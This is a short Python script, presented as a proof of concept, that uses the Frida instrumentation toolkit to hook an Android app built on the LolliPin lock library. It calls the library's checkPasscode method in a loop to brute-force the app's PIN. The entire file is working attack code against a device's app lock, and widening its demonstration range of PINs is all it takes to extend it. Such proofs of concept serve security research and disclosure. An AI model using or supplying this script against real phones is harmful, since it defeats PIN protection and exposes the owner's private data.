# LolliPin bruteforce proof of concept
# Author: Dominic Chell - @domchell
 
import frida,sys
 
def print_result(message):
            print "[*] Testing PIN %s" %(message)
 
def on_message(message, data):
            print_result(message['payload'])
 
jscode = """
 
Java.perform(function () {
   
    var LockManager = Java.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");
    var LockManagerInstance = LockManager.getInstance();
    var AppLock = LockManagerInstance.getAppLock();
 
    for(var i=1230; i<1235; i++)
    {
            var result = AppLock.checkPasscode(i+"");
        send(i + ": " + result);
    }
});
"""
 
process = frida.get_usb_device(1).attach("com.github.orangegangsters.lollipin")
 
script = process.create_script(jscode)
script.on('message', on_message)
 
print "[*] Bruteforcing PIN code"
 
script.load()
sys.stdin.read()

